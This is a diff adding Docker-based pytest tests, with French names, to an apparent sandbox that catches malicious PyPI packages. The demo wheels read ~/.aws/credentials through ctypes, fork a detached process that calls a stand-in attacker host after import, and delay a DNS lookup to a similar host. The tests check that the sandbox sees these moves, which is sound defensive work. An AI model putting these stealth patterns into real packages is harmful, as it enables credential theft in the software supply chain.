@@ -92,3 +92,68 @@ def test_un_paquet_piege_est_pris_la_main_dans_le_sac(tmp_path, monkeypatch):
     assert "~/.aws/credentials" in r.leurres_lus
     assert "GITHUB_TOKEN (exfiltré)" in r.leurres_lus
     assert "~/.aws/credentials (exfiltré)" in r.leurres_lus
+
+
+# --- v2 : strace et battement ------------------------------------------------------------------
+
+NATIF = '''
+import ctypes, os
+libc = ctypes.CDLL(None)
+fd = libc.open(os.path.expanduser("~/.aws/credentials").encode(), 0)
+if fd >= 0:
+    libc.close(fd)
+'''
+
+BATTEMENT = '''
+import os, socket, time
+if os.fork() == 0:          # processus détaché : il « appelle » après la fin de l'import
+    os.setsid()
+    time.sleep(3)
+    try:
+        socket.getaddrinfo("battement.attaquant-demo.example", 443)
+    except OSError:
+        pass
+    os._exit(0)
+'''
+
+
+@pytest.mark.docker
+@avec_docker
+def test_v2_une_lecture_par_ctypes_est_vue_par_strace(tmp_path, monkeypatch):
+    monkeypatch.setenv("SAS_SANDBOX_ATTENTE", "1")
+    r = sandbox.executer(Ecosysteme.PYPI, _roue(tmp_path, "natif_demo", NATIF), "natif_demo")
+    assert "~/.aws/credentials" in r.fichiers_sensibles
+    assert "~/.aws/credentials" in r.leurres_lus
+
+
+@pytest.mark.docker
+@avec_docker
+def test_v2_un_battement_apres_l_import_est_observe(tmp_path, monkeypatch):
+    monkeypatch.setenv("SAS_SANDBOX_ATTENTE", "6")
+    r = sandbox.executer(Ecosysteme.PYPI, _roue(tmp_path, "battement_demo", BATTEMENT),
+                         "battement_demo")
+    assert "battement.attaquant-demo.example" in r.requetes_dns
+    assert r.code_sortie == 0 and not r.delai_depasse
+
+
+def test_v2_attente_par_defaut_de_60_s():
+    assert sandbox.ATTENTE_PAR_DEFAUT_S == 60
+
+
+LENT = '''
+import socket, time
+time.sleep(3)
+try:
+    socket.getaddrinfo("lent.attaquant-demo.example", 443)
+except OSError:
+    pass
+'''
+
+
+@pytest.mark.docker
+@avec_docker
+def test_v2_un_import_lent_est_attendu_jusqu_au_bout(tmp_path, monkeypatch):
+    monkeypatch.setenv("SAS_SANDBOX_ATTENTE", "1")
+    r = sandbox.executer(Ecosysteme.PYPI, _roue(tmp_path, "lent_demo", LENT), "lent_demo")
+    assert "lent.attaquant-demo.example" in r.requetes_dns
+    assert r.code_sortie == 0
